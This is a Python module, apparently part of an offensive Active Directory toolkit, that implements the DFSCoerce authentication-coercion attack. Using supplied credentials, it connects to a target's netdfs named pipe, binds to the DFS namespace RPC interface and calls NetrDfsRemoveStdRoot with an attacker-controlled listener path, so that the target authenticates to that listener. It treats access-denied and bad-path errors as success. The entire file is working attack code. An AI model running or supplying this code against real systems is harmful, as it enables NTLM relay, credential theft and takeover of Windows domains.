# -*- coding: utf-8 -*-
"""DFSCoerce via native DCE/RPC on PIPE\\netdfs (pysmb)."""

from __future__ import annotations

from lib.protocols.samr.dcerpc import DceRpcClient, DceRpcError
from lib.protocols.samr.ndr import pack_unique_wstring, pack_ulong, pack_uuid
from lib.protocols.samr.smb_transport import SmbPipeTransport

_DFSNM_UUID = pack_uuid("4fc742e0-4a10-11cf-8273-00aa004ae673", 3)
_NETR_DFS_REMOVE_STD_ROOT = 13

_COERCE_SUCCESS_MARKERS = (
    "ERROR_BAD_NETPATH",
    "rpc_s_access_denied",
    "0x0000035b",  # ERROR_BAD_NETPATH
    "0x00000005",  # ACCESS_DENIED
)


def _coerce_success(exc: Exception) -> bool:
    text = str(exc)
    return any(marker in text for marker in _COERCE_SUCCESS_MARKERS)


def dfscoerce_coerce(
    username: str,
    password: str,
    domain: str,
    dc_ip: str,
    listener: str,
    target: str,
) -> bool:
    transport = SmbPipeTransport(
        host=target,
        username=username,
        password=password,
        domain=domain,
        remote_name=target,
        pipe_name="netdfs",
    )
    dce = DceRpcClient(transport)
    try:
        dce.connect()
        dce.bind(_DFSNM_UUID)
        stub = (
            pack_unique_wstring(listener, referent=1)
            + pack_unique_wstring("test", referent=2)
            + pack_ulong(0)
        )
        dce.request(_NETR_DFS_REMOVE_STD_ROOT, stub)
    except DceRpcError as exc:
        if not _coerce_success(exc):
            raise
    finally:
        dce.close()
    return True
